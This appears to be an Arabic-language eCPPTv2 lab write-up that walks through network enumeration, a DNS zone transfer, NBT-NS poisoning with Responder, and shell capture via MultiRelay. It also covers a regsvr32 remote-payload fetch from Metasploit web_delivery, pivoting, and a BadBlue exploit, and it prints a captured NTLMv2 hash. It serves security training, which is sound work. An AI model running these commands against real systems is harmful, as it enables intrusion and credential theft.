# Session 5 (eCPPTv2) - Day 5  
## Penetration Testing: Network Security  

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نكمل من الي وقفنا عليه يوم الاربعاء  

---

معنا اليوم باذن الله اول لاب  

Poisoning & Sniffing  
---------------------|  

في هذا اللاب راح نسوي نفس الي سويناه في اخر لاب اسمه Cain & Abel  

طبعا اللاب الي قبل و هذا كذالك لابد تكون داخل الشبكة يعني هذا الهجوم ماتسويه الا وانت داخل الـ internal network  

اول شي طبعا راح نفحص الشبكة كامله عشان نشوف الهوستات الموجوده  
```bash
arp-scan -I eth1 172.16.5.0/24  
```  

نشوف انه عطانا 3 هوستات وعطانا الـ getway  

الان نفحص بالـ nmap  
```bash
nmap -PR -sn 172.16.5.*  
or  
nmap -PR -sn 172.16.5.0-255  
or  
nmap -PR -sn 172.16.5.0/24  
```  

طبعا كل الثلاث اوامر هذي راح تعطيك نفس المخرجات  

طيب الان بنشوف ايش الهوستات الي شغال فيها بورت 53 الي هو الـ DNS  
```bash
nmap -sT -p 53 172.16.5.1,5,6,10  
```  

الان راح يغير اخر اوكت الى 5 بعدين يفحص الي نهايته 6 بعدين الي بعده والي بعده  

طبعا حصلنا فقط واحد اوبن والباقي close  

الان راح نستعمل اداة nslookup عشان نشوف ايش هو الـ Domain name  
```bash
nslookup  
server 172.16.5.10  
172.16.5.5  
```  

نشوف انه عطانا الدومين  

نفس المخرجات راح تكون باداة dig  
```bash
dig @172.16.5.10 -x 172.16.5.5 +nocookie  
```  

طيب نشوف انه عطانا نفس المخرجات السابقه  

الان لو نبي نطلع هوستات زيادة باستخدام DNS zone transfer  
```bash
dig @172.16.5.10 sportsfoo.com -t AXFR +nocookie  
```  

نشوف انه عطانا ايبي ماكان عندنا الي هو 10.10.10.6 وهذا يعني انه فيه شبكة ثانيه الي هي 10.10.10.x  

للاسف ماكملنا الحل بسبب انه كان فيه مشكلة بسيرفر اللاب الي شغالين عليه ف اكتفينا بقرائة اللاب  

---

معنا اليوم باذن الله ثاني لاب  

NBT-NS Poisoning and Exploitation with Responder  
-------------------------------------------------|  

In this lab, you will learn to perform MiTM (Man-In-The-Middle) attack and exploit windows target machines.  

طبعا اول شي راح ناخذ الايبي ونفحص كامل الشبكة  
```bash
ifconfig  
nmap -sn 172.16.5.0/24  
```  

نشوف انه عطانا هوستات up وهوستات down  
راح ناخذ ايبي التارقت تبعنا والي هو نهايته 10 ونفحصه  
```bash
nmap 172.16.5.10  
```  

نشوف انه عطانا عدد كبير من البورتات خلونا الان نفحصه بشكل اعمق ونشغل الديفولت سكربت  
```bash
nmap -A -O 172.16.5.10  
```  

نشوف انه بورت 445 الي هو شغال عليه smb  
يقول انه اصدار Windows 7 Enterprise 7601 Server Pack 1 microsoft-ds  

We will use Responder and MultiRelay tools to perform a MiTM attack to obtain a shell on the 172.16.5.10 machine.  

خلونا نشغل او شي اداة responder عشان نحاول نحصل الـ NTLM hash  
```bash
responder -I eth1 --lm  
```  

نشوف انه فعلا حصلنا NTLMv2 hash from a client (172.16.5.25) of the aline user.  
```bash
NTLMv2 Hash: aline::domain:79d1a136508806fc:931EE422AB6191B39B0B8FEC50176D3A:0101000000000000CEF214357613D80175C2BF005882959E00000000020000000000000000000000  
```  

طبعا يتم حفظ الهاش في مسار الاداة  
```bash
ls /usr/share/responder/logs  
```  

نشوف انه فعلا فيه ملف SMB-NTLMv2-172.16.5.25.log  

طبعا الان راح نشغل اداة MultiRelay ونشوف لو فيه هاشات لتارقت 172.16.5.10  

```bash  
cd /usr/share/responder/tools  
ls  
```  

طيب الان الـ multyrelay.py يستخدم ملفين Runs.exe , Syssvc.exe لكل من x84-64  
طبعا حنا فقط نحتاج ملف exe يكون x86  
خلونا نحذف الملفين القابله لتشغيل ونسوي compile for x86 executable  
```bash
ls /usr/share/responder/tools/MultiRelay/bin  
rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe    
rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe  
ls /usr/share/responder/tools/MultiRelay/bin  
```  

الان راح نسوي Compiling Runas.c and Syssvc.c.  
```bash
i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv  
i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode  
```  
طبعا الاول عشان يسوي لنا كومبايل لملف قابل بتشغل Runs.exe x86  
والملف الثاني راح يكون Syssvc.exe x86  

الان نشوف انه تمام كلشي الان راح نشغل اداة MultyRelay.py  
```bash
./MultiRelay.py -t 172.16.5.10 -u ALL  
```  

طيب حلو الان نفتح الـ responder بتاب ثاني ونخلي التاب الاولى شغاله  
```bash  
responder -I eth1 --lm  
```  

ونشوف بعد ماشغلناه بشوي عطانا الـ Interactive shell  

طبعا لابد نشغل الـ MultyRelay.py قبل تفتح الـ responder  

لو نكتب بعض الاوامر  
```bash
whoami  
ipconfig  
```  

نشوف انه معنا اعلى صلاحيات وكذالك استعلمنا عن الشبكات الموجوده  
10.100.40.100 هذي طبعا شبكة ثانيه موجوده على الجهاز  

ف ممكن نسوي بفتنق يعني فيه افكار كثيره خلونا نشوف الان الخطوه الي بعدها  

طبعا الان نبي نرفع الشيل حقنا من شيل الى meterpreter session  
راح نستخدم موديول جديد الي هو web_delivery  

طبعا فكرت هذا الموديول يوفرلك اكثر  من طريقة انك تشغل الشيل حقك  
وتقدر تختار ايش يكون الشيل حقك يوفر اكثر من خيار خلونا نشوف مع بعض  

```bash
msfconsole -q  
search web_delivery  
use exploit/multi/script/web_delivery  
show options  
show targets  
set TARGET 3  
set LHOST 172.16.5.101  
set PAYLOAD windows/meterpreter/reverse_tcp  
exploit  
jobs  
```  

طبعا في التارقت فيه اكثر من خيار مثل PYTHPON php Powershell regsvr32(registery) etc..  
حنا طبعا اخترنا 3 الي هو يكون الشيل بالـريجستري لانه بيكون مستقر اكثر  
طبعا لابد نتاكد من البايلود انه يتوافق مع الحقن ف حنا اخترنا الريجستر لابد نعدل البايلود زي ماهو موضح في الاعلى  
نشوف انه الان عطانا الامر الي نكتبه بالشيل حق الـ MultyRelay  
```bash
regsvr32 /s /n /u /i:http://172.16.5.101:8080/BGQoUbCVAES.sct scrobj.dll  
```  

الان بعد ماننفذ الامر الي فوق في التارقت مشين عن طريق شيل الـ MultyRelay  
راح نرجع للميتاسبلويت ونشوف انه عطانا سيشن جديده  
```bash  
sessions [to see all session you have]  
sessions -i  1 [to interact with session id 1]  
sysinfo  
getuid  
```  

نشوف انه الان معنا الشيل ودخلنا ومعنا اعلى صلاحيات كذالك  
خلونا الان نشوف ايش الانترفيس الموجوده بهذا التارقت  
```bash  
ipconfig  
```  
نشوف انه interface 17 > ipv4 10.100.40.100  

خلونا الان نفحص كامل الشبكة الجديده باستخدام arp_scanner  
```bash  
run arp_scanner -r 10.100.40.0/24  
```  
نشوف انه عطانا هوستين الهوست الاول الي نهايته 100 وهو الي دخلنا عليه ومعنا شيل عليه  
والثاني الي نهايته 107 هو راح يكون هدفنا الجديد , خلونا نضيف كامل الشبكة بالراوت تيبل  
```bash
run autoroute -s 10.100.40.0/24  
```  

الان خلونا نخلي السيشن بالخلفيه ونفحص التارقت الجديد حقنا  
```bash
background  
use auxiliary/scanner/portscan/tcp  
set RHOSTS 10.100.40.107  
exploit  
```  
نشوف انه حصلنا البورتات هذي 80,135,445,139 شغاله  

خلونا نسوي pivoting الان ونسوي portfwd لبورت 80  
```bash  
sessions -i 1  
portfwd add -l 1234 -p 80 -r 10.100.40.107  
portfwd list  
```  

الان نقدر نفحص اللوكال هوست بورت 1234 وراح نعرف ايش الخدمة الي شغاله على بورت 80 في مشين التارقت  
```bash  
nmap -sV -p 1234 localhost  
```  
نشوف انه شغال عليه خدمة BadBlue 2.7 ونعرف انه مصاب فورا راح نستغله  

خلونا نرجع لتاب الي فيها الـ metapsloit  
ونخلي السيشن الاولى في الخلفيه ونستغل التارقت الجديد  
```bash
bg  
search badblue 
use exploit/windows/http/badblue_passthru  
show options  
```  

طيب الان فقط نعطيه الـ RHOST and payload  
```bash  
set RHOSTS 10.100.40.107  
set PAYLOAD windows/meterpreter/bind_tcp  
exploit  
getuid  
sysinfo  
```  
نشوف انه اخذنا الشيل ونفذنا الاوامر  

وبكذا استغلينا التارقت الثاني بدون اي مشاكل  

الى هنا انتهى اللاب نشوف الي بعده  


طبعا الي بعده هذا اللاب  

ICMP Redirect attack  
---------------------|  

طبعا فقط راح نقراه اليوم وبكرا نطبق لانه مافي وقت  

طبعا فكرة اللاب انه ننفذ هجوم معين والي هو اسمه  
Man In The Meddil Attack  


الى هنا انتهينا باذن الله نكمل بكرا  

---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  
